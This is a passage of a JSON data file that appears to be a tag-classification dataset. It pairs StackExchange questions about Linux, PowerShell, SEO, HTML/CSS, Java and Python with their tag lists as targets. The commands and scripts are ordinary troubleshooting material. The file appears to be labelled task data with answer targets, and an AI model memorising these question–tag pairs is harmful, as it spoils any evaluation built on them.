2.770294] mmc1: new high speed SDIO card at address 0001[    2.932862] EXT4-fs (mmcblk0p2): orphan cleanup on readonly fs[    2.945051] EXT4-fs (mmcblk0p2): 2 orphan inodes deleted[    2.955001] EXT4-fs (mmcblk0p2): recovery complete[    2.971534] EXT4-fs (mmcblk0p2): mounted filesystem with ordered data mode. Opts: (null)[    2.987156] VFS: Mounted root (ext4 filesystem) readonly on device 179:2.[    4.532519] systemd[1]: Expecting device dev-mmcblk0p1.device...[    6.365651] EXT4-fs (mmcblk0p2): re-mounted. Opts: (null)[    6.721847] FAT-fs (mmcblk0p1): Volume was not properly unmounted. Some data may be corrupt. Please run fsck.[    7.736280] Adding 102396k swap on /var/swap.  Priority:-1 extents:7 across:307200k SSFSRefuses to run fsck:fsck from util-linux 2.25.2e2fsck 1.42.12 (29-Aug-2014)/dev/mmcblk0p2 is mounted.e2fsck: Cannot continue, aborting.Also, refuses to unmount /dev/mmcblk0p2 - claiming target is busy.Tried:shutdown -F -r nowResulting in:Code should not be reached 'Unhandled option' at ../src/systemctl systemctl.c:6316, function shutdown_parse_argv(). Aborting.Aborted",
    "target": "debian;reboot"
  },
  {
    "id": "_webapps.105330",
    "source": "Enumerate Google Place IDs <eos> Where can I see or export a list of Google Places with IDs?From Google My Business, I only get a text export, with no Google ID.",
    "target": "google my business"
  },
  {
    "id": "_webmaster.71564",
    "source": "Website with traffic must shut down, should I redirect? <eos> I have a website with a good amount of traffic but I must shut down this website.I have another website that is not very well ranked on Google.Is there something I could do to help my second website with SEO such as a redirect or DNS change?",
    "target": "seo;domains;dns"
  },
  {
    "id": "_codereview.152658",
    "source": "Creating a script to automate implicit remoting <eos> Goal:I am attempting to create a script that would automatically establish a PSSession to a Windows server for implicit remoting.Problem:Export-PSSession : Proxy creation has been skipped for the '%' command, because Windows PowerShell could not verify the safety of the command name.At Z:Somewhere\\aScript.ps1:12 char:3+   Export-PSSession -Session $ServerPS -OutputModule 'First Module' - ...+   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidData: (:) [Export-PSSession], InvalidOperationException    + FullyQualifiedErrorId : ErrorSkippedUnsafeCommandName,Microsoft.PowerShell.Commands.ExportPSSessionCommandSide notes:A large number of users will use this script to establish PSSessions daily, I am trying to find the most efficient way to get all the users to access these modules - Amodule, Bmodule and Cmodule. Additionally, the script still works despite the above mentioned error.Here is a sample of my script:$Server = New-PSSession -ComputerName ServerPS -Authentication KerberosSet-Alias -Name go -Value Get-CustomMods -Description 'Gets the modules'function Get-CustomMods{  # Import first module  Write-Verbose -Message 'Importing First module'  Invoke-command { import-module 'Amodule.ps1' } -session $ServerPS  Export-PSSession -Session $Server -OutputModule 'Amodule' -Force -AllowClobber  # Import second module  Write-Verbose -Message 'Importing Second Module'  Invoke-command { import-module 'Bmodule.ps1'} -session $ServerPS  Export-PSSession -Session $Server -OutputModule 'Bmodule' -Force -AllowClobber  # Import third module   Write-Verbose -Message 'Importing Third Module'  Invoke-command { import-module 'Cmodule.ps1' } -session $ServerPS  Export-PSSession -Session $Server -OutputModule 'Cmodule' -Force -AllowClobber}Question:Is there a more effective way to structure/write this script given my goal and problem? ",
    "target": "powershell"
  },
  {
    "id": "_webmaster.39426",
    "source": "What can be done through XFrames, as compared to IFrame in html? <eos> What can be done through XFrames, as compared to iframe in html?Is there any new feature other than making it easier to bookmark in XFrame as compared to IFrame?",
    "target": "html;iframe;learning"
  },
  {
    "id": "_softwareengineering.305464",
    "source": "Legitimate real work in a constructor? <eos> I am working on a design, but keep hitting a roadblock. I have a particular class (ModelDef) that is essentially the owner of a complex node tree built by parsing an XML schema (think DOM). I want to follow good design principles (SOLID), and ensure that the resulting system is easily testable. I have every intention of using DI to pass dependencies into the constructor of ModelDef  (so that these can easily be swapped out, if need be, during testing).What I'm struggling with, though, is the creation of the node tree. This tree is going to be made up entirely of simple value objects which will not need to be independently tested. (However, I may still pass an Abstract Factory into ModelDef to assist with the creation of these objects.) But I keep reading that a constructor should not do any real work (e.g. Flaw: Constructor does Real Work). This makes perfect sense to me if real work means constructing heavy-weigh dependent objects that one might later want to stub out for testing. (Those should be passed in via DI.) But what about light-weight value objects such as this node tree? The tree has to be created somewhere, right? Why not via the constructor of ModelDef (using, say, a buildNodeTree() method)?I don't really want to create the node tree outside of ModelDef and then pass it in (via constructor DI), because creating the node tree by parsing the schema requires a significant amount of complex code -- code that needs to be thoroughly tested. I don't want to relegate it to glue code (which should be relatively trivial, and will likely not be directly tested).I have thought of putting the code to create the node tree in a separate builder object, but hesitate to call it a builder, because it doesn't really match the Builder Pattern (which seem to be more concerned with eliminating telescoping constructors). But even if I called it something different (e.g. NodeTreeConstructor), it still feels like a bit of a hack just to avoid having the ModelDef constructor build the node tree. It has to be built somewhere; why not in the object that's going to own it?",
    "target": "java;design;design patterns;dependency injection;constructors"
  },
  {
    "id": "_unix.266238",
    "source": "Linux tar files less than 3 months ago using date in filename <eos> In Linux I have files which filename is starting with date YYYYMMDD20160201_001.pdf20160110_002.pdf20150201_003.pdf20140201_004.pdfI want to tar those files less than the following date range (not using mtime, but filename period) date +'%Y%m' -d '4 months ago'  (201511)Basically i want to dofiles=($(find . -name filename< date +'%Y%m' -d '4 months ago'))tar cvfz backup.tar.gz ${files[@]}The expected result of files being tar-ed: 20150201_003.pdf20140201_004.pdfHow can I do that?",
    "target": "bash"
  },
  {
    "id": "_unix.383445",
    "source": "not all RAM recognised (on 64bit CPU) <eos> I've installed Ubuntu server 16.04 (64bit) on a Dell fx160 thin client (has an atom 230 processor). This device has two sticks of ram in it, 2 GB each. When I execute lshw I see that it correctly recognises that the two sticks have 2 GB each. When I run free however, only 3 GB (3079672 kB) of memory is reported as being available.Removing either of these sticks causes free to report exactly 2 GB, but when inserted together only 3 GB remains.I searched around a lot, but unfortunately I remain clueless as to what can cause this and how I can solve this.Has anyone had a similar problem in the past?",
    "target": "ubuntu;memory;ram;64bit"
  },
  {
    "id": "_webmaster.65270",
    "source": "Google is not crawling and indexing my site after updating my robots.txt file <eos> I have an issue with Google not being able to properly crawl my site. I have read other questions where people have had the same issue.  I've tried to follow their solution of using this in my robots.txt file:User-agent: *Disallow:Sitemap: http://www.sonjalimone.com/sitemap_index.xmlI have waited over 24 hours for Google to recrawl my site so I must have something wrong in the robots.txt file. It is a WordPress site if that makes any difference, though I don't see why it would.Does anyone know what else might cause this issue or is there something wrong with the above?",
    "target": "google;google search console;robots.txt"
  },
  {
    "id": "_unix.81309",
    "source": "Deadlock in a crontab between cron and its child defunct processes <eos> I'm having a strange case of deadlock, where the two processes launched by cron are defunct, but cron does not pick the return code and exit. I don't have access to the root user.myuser@myserver:~) ps -ef | grep 30163                                  11:29AM3701     28964 29950  0 11:30 pts/13   00:00:00 grep 30163root     30163  6622  0 11:00 ?        00:00:00 /usr/sbin/cron3701     30199 30163  0 11:00 ?        00:00:00 [monitor_daemon] <defunct>3701     30598 30163  0 11:00 ?        00:00:00 [sendmail] <defunct>myuser@myserver:~)Is there a known reason why we would end up in such a situation?How, without having access to the root user, can I get rid of those three processes that consume memory?I'm using the following kernel/distribution:Linux myserver 2.6.32.23-0.3-default #1 SMP 2010-10-07 14:57:45 +0200 x86_64 x86_64 x86_64 GNU/LinuxLSB_VERSION=core-2.0-noarch:core-3.2-noarch:core-4.0-noarch:core-2.0-x86_64:core-3.2-x86_64:core-4.0-x86_64SUSE Linux Enterprise Server 11 (x86_64)VERSION = 11PATCHLEVEL = 1",
    "target": "process;cron;suse"
  },
  {
    "id": "_softwareengineering.210339",
    "source": "Geographically Distributed (Data & App) Architecture <eos> Is there any design patterns (or best practices) for implementing a geographically distributed system (mostly a database)?Description: There is a network of warehouses and a central office. Now I want every warehouse replicates it's data to the central office and the central office replicates just that portion of data related to that warehouse (when it's modified). This I can call a filtered replication. Our database here is SQL Server 2008 R2. Should I go with another database? How about NoSQL databases?This is a .NET based solution.So far I have learnt about Web Synchronization for Merge Replication and I am investigating it; but I did not learnt how to implement filtered replication yet. I am not sure how NoSQL fits for an e-commerce problem (I think I need to use a combination of NoSQL+RDBMS if I should go that way) but I am investigating RavenDB and MongoDB.Any insight would help a lot; Thanks;",
    "target": "design patterns;architecture;database;distribution;data replication"
  },
  {
    "id": "_ai.3548",
    "source": "Getting started with Artificial intelligence <eos> I'm currently pursuing Computer science engineering.So I would like to know where to start and what mathematics is needed to jump in.",
    "target": "ai community"
  },
  {
    "id": "_codereview.117322",
    "source": "Recreating Google homepage for learning purposes <eos> Like other posters, I'm currently working on recreating Google's Homepage for The Odin Project.I'm new to HTML and CSS but I'm eager to learn and have been looking around for an answer, testing different code, and pacing back & forth - I'm still stuck.I'm having an issue with positioning things on my project. I've read through W3School's documentation on CSS but the method in which I used to position my buttons Google Search & I'm feeling lucky seems like a in-this-case-solution that may not work with all browsers or especially responsive design.This is the area I'm trying to duplicate:I was able to center the logo and the search bar with:{margin-left: auto;margin-right: auto;display: block;}I was able to center the buttons with:#googleSearch {display: inline-block; margin-left: 520px;margin-right: auto;}#feelingLucky {display: inline-block;}All of my code is below but my questions is: is there a better way to position the buttons and if so, what? Playing with the margin-left until it looks right seems to me like the equivalent of using a bunch of line breaks instead of changing the margin or padding. li {font-family: arial,sans-serif;font-size: 13px; list-style: none; display: inline-block;}nav {text-align: right; padding-right: 160px; word-spacing: 10px;}#userName {opacity: .55;}a, a:visited {color: black; text-decoration: none;}a:hover {text-decoration: underline;}img, #searchBox {display: block;margin-left: auto;margin-right: auto;}img {margin-top: 200px}#googleSearch {display: inline-block; margin-left: 520px;margin-right: auto;}#feelingLucky {display: inline-block;}<!DOCTYPE HTML><html lang=en><head><link rel=stylesheet href=index.css><meta charset=UTF-8><title>Google</title><link rel=shortcut icon type=image/x-icon href=http://www.google.com/favicon.ico>    </head><body><header><nav>    <ul>    <li><span id=userName>Jarod</span></li>        <li><a href=https://accounts.google.com/ServiceLogin?passive=1209600&continue=https%3A%2F%2Faccounts.google.com%2FManageAccount&followup=https%3A%2F%2Faccounts.google.com%2FManageAccount>Gmail</a></li>        <li><a href=https://www.google.com/imghp?hl=en&tab=wi&ei=yeCeVp3uLcyMmQH3mJ8w&ved=0EKouCBYoAQ>Images</a></li>    </ul>       </nav>    </header><img src=https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png alt=Logo>     <form action=# method=get name=searchForm>    <input id=searchBox type=text name=searchBox><br>        <div id=googleSearch>    <input id=two type=submit value=Google Search>            <input id=feelingLucky type=submit value=I'm Feeling Lucky>    </form>    </body><footer></footer></html>Is there a better way to position my buttons?",
    "target": "beginner;html;css"
  },
  {
    "id": "_softwareengineering.114681",
    "source": "what is the purpose of arrows? <eos> I am learning functionnal programming with Haskell, and I try to grab concepts by first understanding why do I need them.I would like to know the goal of arrows in functional programming languages. What problem do they solve? I checked http://en.wikibooks.org/wiki/Haskell/Understanding_arrows and http://www.cse.chalmers.se/~rjmh/afp-arrows.pdf. All I understand is that they are used to describe graphs for computations, and that they allow easier point free style coding.The article assume that point free style is generally easier to understand and to write. This seems quite subjective to me. In another article (http://en.wikibooks.org/wiki/Haskell/StephensArrowTutorial#Hangman:_Main_program), a hangman game is implemented, but I cannot see how arrows makes this implementation natural.I could find a lot of papers describing the concept, but nothing about the motivation.What I am missing?",
    "target": "functional programming;haskell"
  },
  {
    "id": "_datascience.15791",
    "source": "Multiple Instance Ranking Algorithm <eos> Can somebody explain me in a simple language how multiple instance ranking algorithm works? What is ranking function? how mathematically it is expressed?",
    "target": "image classification"
  },
  {
    "id": "_unix.260645",
    "source": "Playing remote audio files over SSH <eos> I am connected to a machine via SSH and I often need to listen to WAV files on that machine. Iusually open another terminal window and do ssh host 'cat /path/to/sound.wav' | aplay, but that's tedious since I have to enter my password every time (I cannot use public-key authentication) and the file paths are long.What I would like to do is start magic-command on my local computer, and then whenever I need to listen to a remote file, run play-locally sound.wav from the remote shell and hear the sound from my speakers. Is this possible?",
    "target": "ssh;audio;remote;streaming;wav"
  },
  {
    "id": "_codereview.12632",
    "source": "Pattern Matching with Mismatch <eos> I have been using a slightly modified Hamming Distance algorithm for approximate String Matching for patterns and wondering if there is something better out there. The t being the length of the text and p being the length of the pattern the worst case is roughly O(t*p). Which from looking at other Fuzzy String matching seems to be in norm.       final int mismatches = 1;    final String text = bubbles;    final String pattern = bu;        for(int iter = 0; iter < text.length() - pattern.length() + 1; iter++)    {        int missed = 0;        int ator = 0;        do        {            if(text.charAt(iter + ator) != pattern.charAt(ator))            {                missed++;            }        }while(++ator < pattern.length() && missed <= mismatches);        if(missed <= mismatches)        {            System.out.println(Index:  + iter +  Pattern:  + text.substring(iter, iter + pattern.length()));        }    }The output being indexes 0 bu, 2 bb, and 3 bl. The last two being mismatches with the tolerance of 1.",
    "target": "java;strings"
  },
  {
    "id": "_unix.137827",
    "source": "Static IP on BBB won't change with network/interfaces file <eos> I'm using multiple BBB's (Rev C), communicating with them from my Mac (OSX 10.9.3) over USB using the HoRNDIS drivers. The BBB's are running Debian, and so I want to manually assign them all different static IP's. However, I can't get the IP to be anything but 192.168.7.2. Changing the /etc/network/interfaces file to have an ip of 192.168.7.10 does nothing:# This file describes the network interfaces available on your system# and how to activate them. For more information, see interfaces(5).# The loopback network interfaceauto loiface lo inet loopback# The primary network interface#auto eth0#iface eth0 inet dhcp# Example to keep MAC address between reboots#hwaddress ether DE:AD:BE:EF:CA:FEauto eth0iface eth0 inet staticaddress 192.168.2.2netmask 255.255.255.0network 192.168.2.0broadcast 192.168.2.255gateway 192.168.2.1# WiFi Example#auto wlan0#iface wlan0 inet dhcp#    wpa-ssid essid#    wpa-psk  password# Ethernet/RNDIS gadget (g_ether)# ... or on host side, usbnet and random hwaddr# Note on some boards, usb0 is automaticly setup with an init script# in that case, to completely disable remove file [run_boot-scripts] from the boot partitioniface usb0 inet static    address 192.168.7.10    netmask 255.255.255.0    network 192.168.7.0    gateway 192.168.7.1Indeed, there was a file in the boot partition that I also changed, with no result:#!/bin/bash# Update /etc/network/interfaces to add virtual Ethernet portcat >>/etc/network/interfaces <<EOFiface usb0 inet static  address 192.168.7.10  netmask 255.255.255.0  network 192.168.7.0  gateway 192.168.7.1EOF# Add terminal to virtual serial portcat >/etc/init/gadget-serial.conf <<EOFstart on stopped rc RUNLEVEL=[2345]stop on runlevel [!2345]respawnexec /sbin/getty 115200 ttyGS0EOF# Write script to start gadget drivercat >/usr/sbin/g-multi-load.sh <<'EOF'#!/bin/bashif [ `lsmod | grep g_multi` !=  ]; then exit 0; fimac_addr=/proc/device-tree/ocp/ethernet@4a100000/slave@4a100300/mac-addresseeprom=/sys/bus/i2c/devices/0-0050/eepromDEV_ADDR=$(perl -e 'print join(:,unpack((H2)*,<>))' ${mac_addr})VERSION=$(perl -e '@x=unpack(A12A4,<>); print $x[1]' ${eeprom})SERIAL_NUMBER=$(perl -e '@x=unpack(A16A12,<>); print $x[1]' ${eeprom})ISBLACK=$(perl -e '@x=unpack(A20A4,<>); print $x[1]' ${eeprom})BLACK=if [ ${ISBLACK} = BBBK ] ; then    BLACK=Blackfiif [ ${ISBLACK} = BNLT ] ; then    BLACK=Blackfimodprobe g_multi file=/dev/mmcblk0p1 cdrom=0 stall=0 removable=1 nofua=1 iSerialNumber=${SERIAL_NUMBER} iManufacturer=Circuitco iProduct=BeagleBone${BLACK} host_addr=${DEV_ADDR}# Enable the network interfacesleep 1ifup usb0EOFchmod +x /usr/sbin/g-multi-load.sh# Add script to rc.localperl -i -pe 's!^exit 0!/usr/sbin/g-multi-load.sh\\nexit 0!' /etc/rc.local# Install DHCP serversudo apt-get -y updatesudo apt-get -y install isc-dhcp-server# Configure DHCP servercat >/etc/ltsp/dhcp.conf <<EOFddns-update-style none;subnet 192.168.7.0 netmask 255.255.255.252 {  range 192.168.7.1 192.168.7.1;}EOFperl -i -pe 's/INTERFACES=.*/INTERFACES=usb0/' /etc/default/isc-dhcp-server# Start up services/usr/sbin/g-multi-load.shservice isc-dhcp-server start",
    "target": "debian;arm"
  },
  {
    "id": "_codereview.52594",
    "source": "more elegant way when call parent method with the same name <eos> My subclass extends the Formatter class,I wonder know is there any elegant way, to rewrite my codeParentclass Formatter(object):    def resp_in_hash(self, resp):        ...        return rtn_hashChildfrom formatter import Formatter# -----------------------------------------------------------------class Request(Formatter):    def req(self, url_path, is_no_cache=True):        ...    def resp_in_hash(self, url_path):        resp, content = self.req(url_path)        return super(Request, self).resp_in_hash(content)",
    "target": "python"
  }
]